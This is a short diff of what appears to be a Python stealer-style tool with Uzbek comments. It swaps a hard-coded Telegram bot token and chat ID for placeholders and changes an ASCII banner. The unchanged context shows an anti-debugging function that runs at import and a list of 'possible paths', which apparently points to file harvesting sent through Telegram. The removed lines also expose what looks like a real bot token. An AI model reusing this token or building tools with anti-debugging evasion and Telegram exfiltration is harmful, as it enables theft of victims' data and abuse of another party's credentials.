@@ -7,8 +7,8 @@ import requests
 from tempfile import TemporaryDirectory
 from random import choices
 # Telegram bot token va chat_id ni qo'y
-TELEGRAM_BOT_TOKEN = "8689498614:AAH1_l5m67acGvn3X2Ndndo6QxhfprC3GS0"
-TELEGRAM_CHAT_ID = 7273147602
+TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
+TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
 
 def anti_debugging():
     if hasattr(sys, "gettrace") and sys.gettrace():
@@ -17,10 +17,11 @@ def anti_debugging():
 anti_debugging()
 
 BANNER = r"""
-     _      __           _ _   _ _   
-  __| |___ / _|__ _ _  _| | |_(_) |__
- / _` / -_)  _/ _` | || | |  _| | / /
- \__,_\___|_| \__,_|\_,_|_|\__|_|_\_\                       
+  ___     _                       _   _             _             
+ | _ \_ _(_)_ ____ __  __ _ _  _ | | | |_  _ _ _  | |_ ___ _ _ 
+ |  _/ '_| \ V / _` / _| || | || | |_| | ' \  _| |  _/ -_) '_|
+ |_| |_| |_|\_/\__,_\__|\_,_|\_, | \___/|_||_|_|    \__\___|_|  
+                             |__/                               
 """
 
 # Ehtimoliy yo'llar ro'yxati
